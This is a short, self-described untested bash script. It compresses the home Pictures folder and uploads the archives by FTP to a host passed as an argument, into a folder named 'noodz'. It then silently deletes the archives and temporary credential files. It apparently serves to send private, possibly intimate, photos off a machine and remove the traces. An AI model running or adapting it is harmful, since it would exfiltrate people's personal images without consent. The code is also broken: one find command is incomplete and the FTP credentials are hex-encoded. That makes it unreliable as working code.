#!/bin/bash

# completely untested

echo $1 > infile_1
echo $2 > infile_2

username=$(xxd -p infile_1)
password=$(xxd -p infile_2)

gzip -kqr ~/Pictures

find ~ -type d -name 

ftp -inv $3 <<EOF
user $username $password
mput *.gz noodz
bye
EOF

rm --interactive=never *.gz infile_*